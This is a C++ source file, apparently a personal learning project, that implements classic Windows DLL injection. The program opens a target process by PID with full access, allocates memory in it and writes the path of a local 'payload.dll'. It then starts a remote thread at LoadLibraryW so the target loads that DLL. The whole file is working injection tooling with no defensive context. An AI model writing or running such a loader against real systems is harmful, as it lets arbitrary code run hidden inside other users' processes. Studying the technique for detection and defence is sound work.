//Note: Keep track of binareis x64/x86, you need to match the other

#include <windows.h>
#include <iostream>
#include <filesystem>

//status symbols
const char* k = "[+] ";
const char* i = "[*] ";
const char* e = "[-] ";

//Every process has an id: PID
DWORD PID, TIO = NULL;
LPVOID rBuffer = NULL;
HMODULE hKernel32 = NULL;
HANDLE hProcess, hThread = NULL;

//Path to dll
wchar_t dllPath[MAX_PATH] = L"C:\\Users\\mmoran\\Projects\\Git-Repos\\MechTabby\\cpp\\inject\\payload.dll";
size_t dllPathSize = sizeof(dllPath);


int main(int argc, char* argv[]){
	
	//Check for dll path
	if (std::filesystem::exists(dllPath) == false) {
		std::cout << e << "dll not found. error: " << GetLastError() << std::endl;
		return 1;
	}


	//PID supply, check there are more than 2 arguments
	if (argc < 2) {
		std::cout << e << "Useage: program.exe <PID>" << std::endl;
		return 1;
	}

	//Take in first argument after program and save to PID
	//PID = atoi(argv[1]);
	PID = std::stoi(argv[1]);

	std::cout << k << "PID: " << PID << std::endl;

	//Returns a valid handle if success, otherwise null.
	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS, //Requests total access, sketchy and not normal
		FALSE, 
		PID);

	//Check for missing access:
	if (hProcess == NULL) {
		std::cout << e << "Could not get a handle to the process " << PID << " " << GetLastError() << std::endl;
		return 1;
	}

	std::cout << k << "Got Process handle: " << hProcess << std::endl;


	//Allocate bytes to proccess memory / resevre a certain amount of space within the process
	rBuffer = VirtualAllocEx(
	 	hProcess, //Process handle
	 	NULL, 
	 	dllPathSize, //Size of reserve
	 	(MEM_COMMIT | MEM_RESERVE), 
	 	PAGE_READWRITE); //Memory Permisson

	//Check for allocation success:
	if (rBuffer == NULL) {
		std::cout << e << "Could not allocate "<< dllPathSize << " bytes in process memory. " << GetLastError() << std::endl;
		return 1;
	}

	std::cout << k << dllPathSize << "allocated buffer to process memory w/ rw permission. " << std::endl;

	//Write Procces Memory
	WriteProcessMemory(hProcess, rBuffer, dllPath, dllPathSize, NULL);
	std::cout << k << "Wrote "<< dllPath << " to process memory" << std::endl;


	//Try to get Kernel Handle:
	hKernel32 = GetModuleHandleW(L"Kernel32");
	
	if (hKernel32 == NULL) {
		std::cout << e << "Failed to get a handle to Kernel32. " << GetLastError() << std::endl;
		CloseHandle(hProcess);
		return 1;
	}

	std::cout << k << "Got valid Kernel32.dll handle! "<< hKernel32 << std::endl;

	//Reach into the module, and find the address to a function we need. (In this case, LoadLibrary!)
	LPTHREAD_START_ROUTINE startThis = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	std::cout << k << "Got the address of LoadLibraryW(): "<< startThis << std::endl;

	//Create thread
	hThread = CreateRemoteThread(hProcess, NULL, 0, startThis, rBuffer, 0, &TIO);

	if (hThread == NULL){
		std::cout << e << "Unable to get a handle to the remote thread. " << GetLastError() << std::endl;
		CloseHandle(hProcess);
		return 1;
	}
	std::cout << k << "Got the handle to new thread: "<< hThread << std::endl;

	std::cout << i << "Waiting for thread to finish..." << std::endl;
	WaitForSingleObject(hThread, INFINITE);
	std::cout << i << "Thread is Finished." << std::endl;
	
	CloseHandle(hThread);
	CloseHandle(hProcess);

	std::cout << i << "All Done!" << std::endl;
	return 0;
}
